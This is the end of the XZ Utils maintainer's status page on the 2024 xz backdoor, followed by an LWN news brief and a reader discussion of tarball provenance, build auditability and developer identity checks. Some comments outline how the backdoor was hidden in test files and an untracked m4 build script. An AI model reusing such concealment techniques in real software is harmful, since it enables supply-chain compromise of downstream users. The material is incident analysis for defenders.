* The email address xz *at* tukaani *dot* org no longer forwards to Jia Tan.
  This change was made on 2024-03-30.
* 2024-04-09: The Git repositories of XZ projects are available
  on [GitHub](https://github.com/tukaani-project) again.
  Please use these for downloading the code to reduce the bandwidth usage
  on git.tukaani.org.
* GitHub had closed all pull requests and
  marked them as if I had closed them on 2024-04-05.
  I didn’t close any PRs on that day, GitHub just misattributed it to me.
  On 2024-04-12 I tried to re-open PRs and GitHub immediately closed them again,
  again marking them as if I had done it.
  (On IRC it was suggested that
  this might have happened because the PRs refer to forks that are disabled.)
* After the primary location of xz.git was officially moved to GitHub,
  I didn’t detected any force pushes to the master or v5.x branches.
  I haven’t force pushed to git.tukaani.org.
* However, I force pushed to the xz-java repository on GitHub on 2024-04-05,
  deleting two harmless commits by Jia.
  I had pushed commits to git.tukaani.org
  when the repositories on GitHub were disabled
  and I didn’t have the two commits by Jia available locally.
* The version 1.0 of the [XZ Utils review notes](review.html) was
  published on 2024-05-29.
  (The first work-in-progress version was published on 2024-04-15.)
* New, clean XZ Utils releases were made on 2024-05-29.
  The [home page](../xz/) is available again too.

## To media and reporters

I won’t reply for now.
I might reconsider after my planned article is out.

## Email

I have gotten a lot of email.
Thanks for the positive comments.
Unfortunately I don’t have time to reply to most of them.

## Donations

A few have suggested that I should enable GitHub Sponsors.

The Finnish law doesn’t allow a private person
to request money from the general public and give nothing in return.
Certain types of organizations can ask for donations but
to do that even they need to get a permit first.

This means that things like GitHub Sponsors don’t seem legal to use.

## Plans

### Git repositories

There was discussion if the master branch should have been rebased to purge
the malicious files.
This would have been equivalent to dropping
[eight commits](https://git.tukaani.org/?p=xz.git;a=commit;h=e93e13c8b3bec925c56e0c0b675d8000a0f7f754).
The main benefit would have been that then
antivirus software wouldn’t complain about them.
Otherwise the files are harmless without the trigger code that was never
included in the Git repository.

It was decided that the Git repository will *not* be rebased.

The other Git repositories (xz-embedded and xz-java) are fine
and never had malicious or suspicious content.

### Releases

There was discussion if the 5.6.x version numbers shouldn’t be used further
and the next release could be 5.8.0.
However, it felt clearer to make XZ Utils 5.6.2 as a cleanup step.
There are a few small improvements planned which could become 5.8.0
in shorter time than usual, hopefully replacing 5.6.x somewhat soon.

### What can be learned from this

I’m writing an article how the backdoor got into the releases
and what can be learned from this.
This is taking much longer than I had thought.
I’ve made progress but I don’t want to estimate when it’s ready.

## Links

* [Details by Andres Freund](https://www.openwall.com/lists/oss-security/2024/03/29/4)
* [FAQ by Sam James](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27)
* [Gentoo bug 928134](https://bugs.gentoo.org/928134)
* [Debian bug 1068024](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068024)

Last updated 2024-12-05 19:34:28 +0200

---

[tukaani.org](../) » XZ Utils backdoor



=== Content from lwn.net_0e6a040f_20250111_034020.html ===


[![LWN.net Logo](https://static.lwn.net/images/logo/barepenguin-70.png)
LWN
.net
News from the source](/)
[![LWN](https://static.lwn.net/images/lcorner-ss.png)](/)

* [**Content**](#t)
  + [Weekly Edition](/current/)
  + [Archives](/Archives/)
  + [Search](/Search/)
  + [Kernel](/Kernel/)
  + [Security](/Security/)
  + [Events calendar](/Calendar/)
  + [Unread comments](/Comments/unread)
  + ---
  + [LWN FAQ](/op/FAQ.lwn)
  + [Write for us](/op/AuthorGuide.lwn)
* [**Edition**](#t)
  + [Return to the Briefs page](/Articles/966927/)

**User:**
**Password:**    |

 |

[**Subscribe**](/subscribe/) /
[**Log in**](/Login/) /
[**New account**](/Login/newaccount)

# A backdoor in xz

[Posted March 29, 2024 by corbet]

Andres Freund has posted [a
detailed investigation](/ml/oss-security/20240329155126.kjjfduxw2yrlxgzm%40awork3.anarazel.de/) into a backdoor that was shipped with versions
5.6.0 and 5.6.1 of the xz compression utility. It appears that the
malicious code may be aimed at allowing SSH authentication to be bypassed.

> I have not yet analyzed precisely what is being checked for in the
> injected code, to allow unauthorized access. Since this is running
> in a pre-authentication context, it seems likely to allow some form
> of access or other form of remote code execution.

The affected versions are not yet widely shipped, but checking systems for
the bad version would be a good idea.

**Update**: there are advisories out now from
[Arch](https://archlinux.org/news/the-xz-package-has-been-backdoored/),
[Debian](https://lists.debian.org/debian-security-announce/2024/msg00057.html),
[Red
Hat](https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users), and
[openSUSE](/ml/opensuse-factory/5d7acd45-7021-4c09-8c0b-6f4b8797aecd%40suse.com/).

[A further
update from openSUSE](https://news.opensuse.org/2024/03/29/xz-backdoor/):

> For our openSUSE Tumbleweed users where SSH is exposed to the
> internet we recommend installing fresh, as it’s unknown if the
> backdoor has been exploited. Due to the sophisticated nature of the
> backdoor an on-system detection of a breach is likely not
> possible. Also rotation of any credentials that could have been
> fetched from the system is highly recommended.

---

 to post comments

### A backdoor in xz

Posted Mar 29, 2024 17:48 UTC (Fri)
by **pbonzini** (subscriber, #60935)
[[Link](/Articles/967183/)] (128 responses)

Based on this should xz be trusted for distribution of upstream tarballs going forward?

### A backdoor in xz

Posted Mar 29, 2024 17:57 UTC (Fri)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967186/)] (3 responses)

Probably not, because the malicious actor has access to the signing key.

Also, that build script is just horrifying.

### A backdoor in xz

Posted Mar 29, 2024 21:57 UTC (Fri)
by **pbonzini** (subscriber, #60935)
[[Link](/Articles/967261/)] (1 responses)

The most horrible parts are introduced by the xz maintainer and are obfuscated (for example they use a variable containing "." to invoke the shell's source builtin). The actual code has some ugly sed substitutions but it's not even comparable to this abomination. You can find it at <https://fossies.org/linux/NetworkManager/m4/build-to-host.m4>

### A backdoor in xz

Posted Mar 29, 2024 22:00 UTC (Fri)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967263/)]

I... beg to differ. It's not any less horrifying.

### A backdoor in xz

Posted Apr 18, 2024 7:46 UTC (Thu)
by **sam\_c** (subscriber, #139836)
[[Link](/Articles/970270/)]

I'm responding to this late, my apologies, but to be clear, there was no single project signing key. Lasse never gave up his own key. There was just an announcement a while ago that future releases would be signed by Jia Tan's key.

### A backdoor in xz

Posted Mar 29, 2024 18:02 UTC (Fri)
by **atnot** (subscriber, #124910)
[[Link](/Articles/967187/)] (123 responses)

That feels kind of misplaced. It's not like every other project is somehow immune to trusting a maintainer after 2+ years of steady contributions, or indeed any maintainer immune to some sort of coercion that might make them backdoor tarballs.

I do however think that this should mean an end to the practice of preferring manually built upstream tarballs over pulling in git sources directly that distributions such as debian have espoused. It's the one weak link where few eyes exist in an otherwise pretty reproducible pipeline and it was really only a question of time until someone took advantage of it.

### A backdoor in xz

Posted Mar 29, 2024 18:13 UTC (Fri)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967191/)] (122 responses)

Yep, we need to stop using curated tarballs, only auto-generated from tags

### A backdoor in xz

Posted Mar 29, 2024 18:51 UTC (Fri)
by **danobi** (subscriber, #102249)
[[Link](/Articles/967199/)] (118 responses)

Wouldn't the autogenerated tarball still contain the malicious checked in test binary?

### A backdoor in xz

Posted Mar 29, 2024 19:12 UTC (Fri)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967206/)] (8 responses)

It's much easier to analyze individual commits.

### A backdoor in xz

Posted Mar 30, 2024 1:10 UTC (Sat)
by **jengelh** (subscriber, #33263)
[[Link](/Articles/967301/)] (7 responses)

When people stop using curated tarballs, developers will just add generated files into the SCM. Some projects have historically done that all along anyway. I happened to find <https://git.savannah.gnu.org/git/bash.git> does that, for example.

Eschewing curated tarballs in favor of an autogenerated git-archive does not do anything to establish that a particular software is fully benevolent. I bet none of you ever vetted m4/po.m4 of [https://github.com/bminor/bash/archive/refs/tags/bash-5.2...](https://github.com/bminor/bash/archive/refs/tags/bash-5.2.tar.gz) .

### A backdoor in xz

Posted Mar 30, 2024 1:29 UTC (Sat)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967309/)] (2 responses)

Of course by itself it doesn't prove that the software is not malicious, how could it? That's not the point, the point is increasing auditability. A commit in a repository is eminently auditable, while random stuff getting injected from a developer's machine in a tarball after the fact, before publishing, is not.

### A backdoor in xz

Posted Apr 3, 2024 7:21 UTC (Wed)
by **LtWorf** (subscriber, #124958)
[[Link](/Articles/968126/)] (1 responses)

Well a commit that generates a configure script is very unlikely to get seriously reviewed

### A backdoor in xz

Posted Apr 5, 2024 13:20 UTC (Fri)
by **rav** (subscriber, #89256)
[[Link](/Articles/968545/)]

My approach to reviewing commits with autogenerated code (in the context of approving a pull request) is to autogenerate the code myself and see if I get the same result. If there are differences between the submitted code and what I could autogenerate myself, then that's probably the interesting stuff to look at. If I don't know how to autogenerate it myself, I ask the author to provide the instructions in the commit message or in a source code comment. Having autogenerated code in a source code repository is not nice, but if it's necessary, then the code review process needs to adapt to it.

### A backdoor in xz

Posted Mar 30, 2024 1:52 UTC (Sat)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967314/)] (2 responses)

> When people stop using curated tarballs, developers will just add generated files into the SCM.

Most of the autogenerated files are autohell-related scripts. Honestly, if you still depend on it, you can install the required dependencies and run autogen.sh yourself on the build host. It's not 1994 anymore.

The SCM management for Bash is atrocious. We just need to switch away from it to something like zsh by default. At this point in time, doing large code drops for something as critical as Bash is just bordering on malpractice.

And relying on autohell for builds \_is\_ malpractice.

### A backdoor in xz

Posted Mar 30, 2024 10:08 UTC (Sat)
by **nim-nim** (subscriber, #34454)
[[Link](/Articles/967382/)] (1 responses)

The build scene is unfortunately ripe for exploits because mainstream tools are old and crufty and the FAANGS, GitHubs and GNOMEs of the world only care about giant monorepos and static builds and vendoring and containers & flatpacks which all basically mean pile up as much code as you can to avoid any dev porting effort and someone else (never defined) will somehow manage to audit the giant pile of stuff and detect malware.

Safe practices are well known that’s small auditable reusable components, that build from signed archives with no third party altered code dropped in, and frugal acyclic dependency graphs but that‘s exactly the reverse of where we’ve been doing those past years. Devs understand code modularity not build modularity.

The pile of junk has been avoiding any catastrophic collapse so far (apart from the log4j episode with every one else pretending it’s java-specific while replicating the very same build workflows) but that’s only a question of time.

### A backdoor in xz

Posted Mar 30, 2024 15:09 UTC (Sat)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967464/)]

> The pile of junk has been avoiding any catastrophic collapse so far ...

Has it? With spies the main thing we know is: we know very little.

### A backdoor in xz

Posted Mar 30, 2024 15:15 UTC (Sat)
by **gdamjan** (subscriber, #33634)
[[Link](/Articles/967465/)]

> When people stop using curated tarballs, developers will just add generated files into the SCM.

There is a solution to that these days.

A Github Actions can take the tagged source code commit, generate artifacts and sign them so you do have the provenance that the artifact (tarball) was created from the given source code with the given github action.

### A backdoor in xz

Posted Mar 29, 2024 19:12 UTC (Fri)
by **rwmj** (subscriber, #5474)
[[Link](/Articles/967205/)] (108 responses)

The exploit is in two parts. Two "test files" which contain the payload; and a modified m4 script (m4/build-to-host.m4) which initiates the process of loading the payload. The test files were added first and are part of git. They don't do anything on their own. The m4 modification was only made in the github tarball, somewhat later, and it's not checked into git. (It was a surprise to me that github release tarballs aren't just tarred up copies of the git checkout.)

Having said all that, I wouldn't rely on any version of xz which "Jia Tan" (a pseudonym, I assume) has touched, and unfortunately he's been contributing to xz and been an upstream committer for 2+ years.

### A backdoor in xz

Posted Mar 29, 2024 19:39 UTC (Fri)
by **ewen** (subscriber, #4772)
[[Link](/Articles/967208/)] (11 responses)

GitHub releases are basically tags, that then have some additional metadata and files associated with them. GitHub does create a “tar of git checkout” automatically like you suggest (although people have been asking for a way to turn that off: <https://github.com/orgs/community/discussions/6003>). But anyone with access can also upload more files, including binaries and their own source archive (with a different name to the automatic ones).

For lots of projects building from the automatic git checkout zip is non trivial (eg missing generated things like configure scripts), so at least historically many projects have suggested people ignore the git checkout archive and use the source archive someone uploaded as a release file, that includes extra generated files.

Possibly it makes sense to switch to always doing the git tag checkout on the build system. But it would definitely complicate things like Debian’s “orig.tar.gz” and patches source archiving process. And probably require some more build dependencies to generate the extra “source” files.

Ewen

### A backdoor in xz

Posted Mar 29, 2024 20:17 UTC (Fri)
by **excors** (subscriber, #95769)
[[Link](/Articles/967224/)] (3 responses)

GitHub's auto-generated tarballs also have the issue that they don't promise stability, so old releases might unexpectedly get a different checksum (with the same content but different compression etc), which can break build systems: <https://lwn.net/Articles/921787/> . GitHub reverted that change, but they still explicitly don't promise long-term stability of archives, and say you should use commit IDs (no checksums) or externally-uploaded release tarballs: [https://github.blog/2023-02-21-update-on-the-future-stabi...](https://github.blog/2023-02-21-update-on-the-future-stability-of-source-code-archives-and-hashes/)

### A backdoor in xz

Posted Mar 29, 2024 20:37 UTC (Fri)
by **randomguy3** (subscriber, #71063)
[[Link](/Articles/967238/)]

commit IDs are their own checksum, of course - providing you use git to grab them

### A backdoor in xz

Posted Mar 30, 2024 0:21 UTC (Sat)
by **jdulaney** (subscriber, #83672)
[[Link](/Articles/967292/)] (1 responses)

it almost sounds as if github should not be used as a release mechanism

### A backdoor in xz

Posted Mar 30, 2024 13:38 UTC (Sat)
by **smurf** (subscriber, #17840)
[[Link](/Articles/967416/)]

You can use github's release mechanism all you like, just be sane about it.

This means that your tarball gets generated by a verified and pinned-down github action and doesn't access external resources. EVER.

While the fact that widely-used libraries like xz still allow developer-supplied release uploads can plausibly be explained (excused, really) with laziness, the line between that and malpractice is a thin one.

Against stupidity, the Gods themselves …

### A backdoor in xz

Posted Mar 30, 2024 2:14 UTC (Sat)
by **salimma** (subscriber, #34460)
[[Link](/Articles/967318/)] (3 responses)

> Possibly it makes sense to switch to always doing the git tag checkout on the build system. But it would definitely complicate things like Debian’s “orig.tar.gz” and patches source archiving process. And probably require some more build dependencies to generate the extra “source” files.

It works just fine on Debian -- you point the watch file to the URL corresponding to the auto-generated tarball, and uscan (whether called directly or via gbp) would generate the orig.tar.gz just fine.

You'd need more build dependencies, sure

### A backdoor in xz

Posted Mar 30, 2024 13:45 UTC (Sat)
by **smurf** (subscriber, #17840)
[[Link](/Articles/967417/)] (2 responses)

Debian's "orig.tar.gz" is itself an anachronism that should be tossed into the garbage bin of history sooner rather than later.

They should check out the appropriately-tagged "debian" git branch, build binaries, package them. Done. No more "grab an orig.tar which you didn't build, then apply patches with poissibly-traceable provenance" dances. PLEASE.

### A backdoor in xz

Posted Apr 1, 2024 5:19 UTC (Mon)
by **ras** (subscriber, #33059)
[[Link](/Articles/967757/)] (1 responses)

> They should check out the appropriately-tagged "debian" git branch, build binaries, package them. Done.

I get what you saying when talking about patches done to the source. Asking git to apply a series of commits is generally much easier then doing the same thing with quilt or whatever.

However, a git repository and git commits aren't in my opinion source code. Which is to say they aren't a program developers can inspect and modify that reproducibly takes pristine upstream source as input, and produces the source that will be distributed and compiled to produce the Debian binary package as output. That's the sort of thing you need to make the process auditable. It's what uscan and patches produce.

Debian does have tools that take a git repository and spit out the debian source packages in an auditable format - and yes that includes the .orig.tar.gz plus patches. Isn't that enough?

### A backdoor in xz

Posted Apr 1, 2024 9:39 UTC (Mon)
by **smurf** (subscriber, #17840)
[[Link](/Articles/967774/)]

> However, a git repository and git commits aren't in my opinion source code.

Source code is defined as the preferred format to use when you want to work on the code in question. I submit that these days the number of upstream authors of nontrivial packages whose workflow consist of "while buggy: edit compile debug", followed by "edit version# && make clean && tar cfz && upload", is essentially zero.

Thus it seems like a good idea to use the code that's actually checked into upstream's version control as a basis for automated building of a distribution's binaries \*and\* the sources it needs to provide, for copyleft-right-and-center reasons if nothing else. Instead of ignoring upstream's git archive and basing the build on some unsigned tarball somebody created somehow.

Mostly-seamless conversion from upstream-plus-patches to Debian-branch-of-git-archive and back is pretty straightforward these days, thanks to dgit and related tools.

### A backdoor in xz

Posted Apr 1, 2024 16:56 UTC (Mon)
by **sammythesnake** (guest, #17693)
[[Link](/Articles/967877/)]

> For lots of projects building from the automatic git checkout zip is non trivial (eg missing generated things like configure scripts)...

Surely the fix for this is for those "generated things" to be generated as part of the build process - if they're auto-generated, then there's no reason for that autogeneration to be out of band. If the repo doesn't include everything that's needed to generate them (modulo configuration for things like build architecture or which features to include or whatever) then it's not "complete corresponding source"

In GPL terms: "all the source code needed to generate, install, and (for an executable work) run the object code") is required for distribution. Even outside of the GPL, it's just bloody obvious to track it - I wouldn't dream of leaving any such out of source control for anything I write. This applies even if I'm not planning to release it, let alone for something others' work relies on - I don't trust even \*myself\* to get it right reliably without git or whatever automating it!

### A backdoor in xz

Posted Apr 7, 2024 13:16 UTC (Sun)
by **chestnut** (guest, #170772)
[[Link](/Articles/968771/)] (1 responses)

> For lots of projects building from the automatic git checkout zip is non trivial (eg missing generated things like configure scripts), so at least historically many projects have suggested people ignore the git checkout archive and use the source archive someone uploaded as a release file, that includes extra generated files.

sorry, I'm a beginner and I didn't find anything on google about "many projects have suggested people ignore the git checkout archive and use the source archive someone uploaded as a release file", can you give me some tips? Maybe a source link, and why not upload these scripts to GitHub

### A backdoor in xz

Posted Apr 7, 2024 14:54 UTC (Sun)
by **pizza** (subscriber, #46)
[[Link](/Articles/968791/)]

> can you give me some tips?

An example of this is darktable: "As always, please don't use the autogenerated tarball provided by github, but only our tar.xz file."

> and why not upload these scripts to GitHub

They pretty much always are, typically called something like "./bootstrap.sh" . But to generate the distribution tarball, you usually need additional dependencies or tools.

Another example of this is gutenprint; As well as the autotools stuff, the distribution tarballs have a lot of other auto-generated stuff (eg supported printer lists) that would otherwise cause major issues if you are trying to cross-compile things.

In both cases the CI systems auto-generates a release tarball after every commit.

### A backdoor in xz

Posted Mar 29, 2024 19:41 UTC (Fri)
by **atai** (subscriber, #10977)
[[Link](/Articles/967216/)] (7 responses)

>Having said all that, I wouldn't rely on any version of xz which "Jia Tan" (a pseudonym, I assume) has touched, and unfortunately he's been contributing to xz and been an upstream committer for 2+ years.

shall all his past commits be analyzed?

### A backdoor in xz

Posted Mar 29, 2024 19:49 UTC (Fri)
by **rwmj** (subscriber, #5474)
[[Link](/Articles/967218/)]

Yes, and analyzing past github hosted tarballs may be even more important.

### A backdoor in xz

Posted Mar 29, 2024 21:44 UTC (Fri)
by **joey** (guest, #328)
[[Link](/Articles/967254/)]

All commits made after he gained control of the project should also be checked, since he could push commits with any purported Author. Or just revert to before that point.

### A backdoor in xz

Posted Mar 30, 2024 2:44 UTC (Sat)
by **helsleym** (guest, #92730)
[[Link](/Articles/967321/)] (4 responses)

The maintainer mentioned something kind of chilling about the activities of "Jia Tan":

> "He has been helping a lot off-list"

That makes the activities of "Jia Tan" harder to audit and could even have been why they diverted discussion off-list. I'm sure it seemed innocuous to the maintainer but thanks to hindsight it seems like a significant social element of this attack.

(source: [https://www.mail-archive.com/xz-devel@tukaani.org/msg0057...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00571.html) )

### A backdoor in xz

Posted Mar 30, 2024 10:20 UTC (Sat)
by **nim-nim** (subscriber, #34454)
[[Link](/Articles/967384/)] (3 responses)

It may or may not have been a pseudonym for a person or a group of people.

The pseudonym may or may not point to a specific country.

The pseudonym holder may or may not have his own credentials compromised.

The pseudonym holder may of may not have had a visit from criminal groups or some agency that made him a proposal he could not refuse.

The pseudonym holder may have been working all this time for those groups, that may be as much interested in securing their own systems as in compromising the systems of others. Or he may be a disgrunted (ex-)employee, retaliating for something we do not know about.

Someday soon it may be an emergent malicious AI masquerading as a person (or just some catastrophic mistake in the way someone trained his model).

The possibilities in the brave new world we live in are endless. It is pointless to speculate or try to audit people at this point. Making builds more transparent and easier to check and audit is what is needed.

### A backdoor in xz

Posted Mar 30, 2024 16:06 UTC (Sat)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967472/)] (2 responses)

> The possibilities in the brave new world we live in are endless.

It is harder to exploit but inserting some memory corruption in C/C++ is orders of magnitude more discreet than this blunt takeover of project ownership. Even better: you get more than one shot at it because you can plausibly pretend it was a genuine mistake. Cause it so often is.

Any spy agency that hasn't successfully done this yet in a variety of open-source projects is incompetent and its management should be fired.

> Making builds more transparent and easier to check and audit is what is needed.

Amen.

And of course: more code reviews, static analysis, test coverage, valgrind, safer languages, etc.

Basically just slow down; less code with more quality. The opposite of what corporations and people want.

### A backdoor in xz

Posted Mar 30, 2024 16:36 UTC (Sat)
by **rra** (subscriber, #99804)
[[Link](/Articles/967474/)] (1 responses)

> Basically just slow down; less code with more quality. The opposite of what corporations and people want.

It's tricky, though, because one of the ways to get more quality is to realize that some of the foundations are shaky and built on a bunch of poorly-thought-out principles. But if you rebuild them, that is a form of speeding up, since it requires changes by everyone else to move to the new thing.

I use a variety of software on a daily basis that, so far as I can tell, has worked correctly for years. In some cases I've been tempted to adopt it and maintain it as part of that effort in slowing down and improving quality. But probably 95% of the time when I look at the source to some old program that I have come to rely on, it's written in janky C with global variables all over the place, static buffers, no comments, and a code flow that I find difficult to follow. I have rescued some of my own software from such a state through the power of sheer embarrassment, but I've yet to have the oomph to rescue someone else's software.

We have an enormous maintenance problem, and I'm not sure what slowing down and writing less code with more quality looks like in the face of that maintenance problem. It's one of the reasons why I'm somewhat sympathetic to the folks who would prefer to rewrite the world. It looks like speeding up and writing more code, the opposite of what you're correctly advocating, but the advantage of a clean slate is that it's a lot easier to add standards for slower work and higher quality when starting from scratch than it is to retrofit them to an existing community, or even an orphaned code base.

(And this is all apart from the fact that slower and higher quality is more expensive, and we lack any effective mechanism to fund resilience, sustainability, and going slower. Not just in software, but in most human endeavor. Most social and political forces are pushing in exactly the opposite direction, as you correctly note.)

### A backdoor in xz

Posted Mar 30, 2024 17:11 UTC (Sat)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967485/)]

> It's one of the reasons why I'm somewhat sympathetic to the folks who would prefer to rewrite the world. It looks like speeding up and writing more code, the opposite of what you're correctly advocating, but the advantage of a clean slate is that it's a lot easier to add standards for slower work and higher quality when starting from scratch than it is to retrofit them to an existing community, or even an orphaned code base

To be clear: if "rewriting the world" works better and faster than raising the bar on an existing and time consuming code base then I'm all for it.

Either is much slower than merging untested and barely reviewed commits.

### A backdoor in xz

Posted Mar 29, 2024 22:20 UTC (Fri)
by **smcv** (subscriber, #53363)
[[Link](/Articles/967270/)] (1 responses)

> (It was a surprise to me that github release tarballs aren't just tarred up copies of the git checkout.)

The tarballs that github itself auto-generates \*are\* just a `git archive`, but those are unsuitable for:

1. projects with git submodules, which need to "flatten" those into a monolithic tarball for it to be possible to build in an offline way from just a tarball;

2. projects with build systems that rely on (or have traditionally relied on) putting generated cruft in the dist tarball, like Autotools when used in its traditional "you don't need any external tools" mode;

3. projects that include convenience copies of anything else in their source tarball, like prebuilt HTML documentation or prebuilt Windows binaries

IMO the answer to the first is to prefer `git subtree`, the answer to the second is to move away from such build systems towards for example Meson or CMake (or failing that, distribute only the actual source and expect recipients to run ./autogen.sh themselves), and the answer to the third is "don't do that, then"; but a lot of projects have at least one of those factors and little appetite for moving away from it.

### A backdoor in xz

Posted Mar 30, 2024 0:53 UTC (Sat)
by **heftig** (subscriber, #73632)
[[Link](/Articles/967299/)]

Git submodules are not that bad as long as the set of submodules doesn't change often and they're limited to a single level. If you have a package build system that can handle Git, you can have it download all the repos, change the URLs in the superrepo to the local clones and git-submodule-update will clone and check out the right commits.

E.g. see [https://gitlab.archlinux.org/archlinux/packaging/packages...](https://gitlab.archlinux.org/archlinux/packaging/packages/ostree/-/blob/main/PKGBUILD?ref_type=heads#L51-85)

Sources for Meson subprojects that aren't in the repo or tarball can also be provided; our Mesa PKGBUILD does this.

But yeah, I would prefer if git-subtree were more popular.

### A backdoor in xz

Posted Mar 29, 2024 22:29 UTC (Fri)
by **mss** (subscriber, #138799)
[[Link](/Articles/967273/)] (85 responses)

"Jia Tan" (a pseudonym, I assume)

If that's truly a nation-state attack (as some claim) then I would assume there's a whole team behind this made-up identity.

### Verify the identity of developers

Posted Mar 30, 2024 7:39 UTC (Sat)
by **epa** (subscriber, #39769)
[[Link](/Articles/967348/)] (84 responses)

It’s probably a dystopian future none of us want. But what if GitHub required all contributors to use their real name and strongly verified their identity? Then for key roles you could require someone with a clear track record and resident in a Western country where they could be prosecuted for maliciously introducing backdoors.

Of course “moles” could still exist, but they would be much more difficult for hostile nations to create than an entirely fake identity like Jia Tan. To add a backdoor the easiest way would then be to compromise some developer’s workstation or steal their private key. Which is by no means impossible, but raises the difficulty somewhat, and is harder to do undetected.

It wouldn’t even need to be GitHub. If Debian started using git sources for releases (no more downloading of random tarballs), a further step would be to require signing of each individual change in the repository (via signed tags or something, I don’t know the details, but it’s possible somehow) and then not trust changes from a new contributor until that person has visited a Debian keysigning party. Again, hardly watertight, but better than no checks at all.

Most of the discussion here has focused on supply chain measures. And I agree with that approach—not trying to “catch the bad guys”. But once the weakest links are tightened, and accepting the fact that we will never have enough reviewers to check every commit, it could make sense to review the people themselves.

### Verify the identity of developers

Posted Mar 30, 2024 8:08 UTC (Sat)
by **immibis** (subscriber, #105511)
[[Link](/Articles/967357/)] (1 responses)

They sort of are, since GitHub introduced mandatory SMS 2FA for anyone it considers important enough.

### Verify the identity of developers

Posted Mar 30, 2024 9:28 UTC (Sat)
by **pabs** (subscriber, #43278)
[[Link](/Articles/967373/)]

There are non-SMS forms of 2FA allowed, TOTP for example, which anyone can do without any identity checks using just software.

### Verify the identity of developers

Posted Mar 30, 2024 9:48 UTC (Sat)
by **kazer** (subscriber, #134462)
[[Link](/Articles/967377/)]

> But what if GitHub required all contributors to use their real name and strongly verified their identity?

That is meaningless when GitHub is used just as a mirror and real commits happen elsewhere.

You would need to require that in every repository for everyone contributing.

Something having PGP/X.509 signature for every committer and commit would be part of the solution, but in case someone decides to turn to the dark side you still need to review every change.

And key here is that these changes were not sufficiently reviewed since we don't know if the account was compromised or not.

### Verify the identity of developers

Posted Mar 30, 2024 10:51 UTC (Sat)
by **mss** (subscriber, #138799)
[[Link](/Articles/967388/)] (10 responses)

But what if GitHub required all contributors to use their real name and strongly verified their identity? Then for key roles you could require someone with a clear track record and resident in a Western country where they could be prosecuted for maliciously introducing backdoors.

This would be blatant discrimination of most of the world population, which isn't lucky enough to live in a Western country.

And if you drop the "Western country" requirement then a rogue nation-state is in the best position to provide its operatives with as many "genuine" identity verification documents as they might need.

### Verify the identity of developers

Posted Mar 30, 2024 12:38 UTC (Sat)
by **epa** (subscriber, #39769)
[[Link](/Articles/967403/)] (9 responses)

Yeah… I didn’t say it would be nice. For security sensitive jobs it’s standard practice to do background checks and to require the person be a US citizen, or whatever. And the check that the person exists (and isn’t a made-up identity or pseudonym) is so basic for any job that it’s not even mentioned.

Anonymous or pseudonymous entities (like “Satoshi”) can make valuable contributions but it may be unwise to put them in a trusted position where code they write is directly executed or installed on millions of systems.

### Verify the identity of developers

Posted Mar 30, 2024 17:54 UTC (Sat)
by **sjj** (guest, #2020)
[[Link](/Articles/967493/)] (8 responses)

Believe it or not, but there are legitimate “security sensitive jobs” that are not in the US, or require American citizens.

Would for example Kenyan devs be “Western” enough for you?

### Verify the identity of developers

Posted Mar 30, 2024 19:52 UTC (Sat)
by **epa** (subscriber, #39769)
[[Link](/Articles/967533/)] (7 responses)

Indeed, I was using Western as shorthand. And now we get into politics. There is surely a scale with rogue states like North Korea on one side and … some other countries on the other side. LWN isn’t the place for a discussion of whether a developer in Kenya can be considered a real person (not a fake identity made by security services) and whether some country has enough rule of law that someone doing malicious things would be prosecuted (rather than sheltered by the authorities). We are not discussing a technical proposal. It gets messy and of course there are those who don’t trust the USA or allies either. All I can say is that we may be forced, unhappily, to start thinking about this stuff.

### Verify the identity of developers

Posted Mar 30, 2024 21:33 UTC (Sat)
by **MarcB** (subscriber, #101804)
[[Link](/Articles/967540/)] (6 responses)

Politics are unavoidable, if you go that route. For example, the US in particular is a proven bad actor here - recall the Snowden revelations about the supply-chain attacks the NSA pulled off. They literally did what nowadays Chinese suppliers are alleged to do - and they used this against supposed allies as well, so there isn't even a "western world against China/Russia" scenario.

This "scale of rogue states" you envision would be one that goes downhill in every direction, no matter from whose perspective you look at it.

Also, if you assume nation-state attackers - which you should - and assume that developers will be working from their home country, then any meaningful verification is simply impossible. It is even unreliable and expensive if you hire employees and have them move to your country. If they stay abroad, it simply can't be done.

### Verify the identity of developers

Posted Mar 31, 2024 8:54 UTC (Sun)
by **epa** (subscriber, #39769)
[[Link](/Articles/967642/)] (5 responses)

Indeed the US has a record here and if I were running a nuclear installation in Iran I would require verified Iranian programmers working within the country. But for the rest of us, there is a difference between western countries and others. Many American businesses and even the government rely on the security of Linux and free software. The black-helicopter guys generally have an interest in helping keep free software secure against attacks from ransomware gangs and hostile nation hacking teams. They may do targeted attacks but it doesn’t help them to poison the well as happened here. So I would still prefer to trust a developer with a known legal identity in a US ally over someone who may not be a real person at all. But again, this is politics, and not something where you’ll ever get everyone in agreement.

### Verify the identity of developers

Posted Apr 1, 2024 13:28 UTC (Mon)
by **farnz** (subscriber, #17727)
[[Link](/Articles/967788/)] (4 responses)

The USA has a track record of attacking its allies via secret programs (as does every other Western democracy I've looked into - the USA is not unique here). There's thus a constant tug-of-war going on; do I trust the USA because they'd prefer me to do well rather than their enemies, or do I distrust them because they would prefer to attack me in order to benefit the USA and American companies at my expense?

Purely in terms of "can I trust their home nation", the only safe developers are those with the same national affiliation as you, since whatever leverage the nation-state can apply to them can also be applied to you. And that, fundamentally, comes down to a personal trust matter; can you trust the people you depend upon, or not? Can you "trust, but verify"? Or are you stuck with an untrustworthy partner whose behaviour cannot be verified?

### Verify the identity of developers

Posted Apr 2, 2024 15:24 UTC (Tue)
by **MarcB** (subscriber, #101804)
[[Link](/Articles/967983/)] (3 responses)

> Purely in terms of "can I trust their home nation", the only safe developers are those with the same national affiliation as you, ...

And even that is a best-case scenario. Many countries do not have strong civil rights and their secret services target their own citizens.

### Verify the identity of developers

Posted Apr 2, 2024 16:08 UTC (Tue)
